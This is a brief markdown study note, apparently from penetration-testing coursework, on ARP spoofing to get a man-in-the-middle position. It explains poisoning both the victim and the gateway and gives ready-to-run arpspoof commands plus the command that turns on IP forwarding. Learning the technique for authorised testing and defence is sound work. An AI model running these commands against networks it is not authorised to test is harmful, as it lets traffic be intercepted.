# ARP Spoofing / Man In The Middle

* We are basically pretending to make an ARP call as a router to the victim and the gateway

1. We tell the gateway that we are the victim, update your ARP table, and associate victim IP with my MAC

2. We tell the victim that I am the gateway, update your ARP table, and associate gateway IP with my MAC

`arp -a`: Shows ARP table

* `arpspoof -i interface -t clientIP gatewayIP` to fool client, tell victim that I am the gateway
* `arpspoof -i interface -t gatewayIP clientIP` to fool gateway, tell gateway that I am the victim

* However, you have to enable `IP_FORWARD` by doing `echo 1 > /proc/sys/net/ipv4/ip_forward` to be able to forward packets
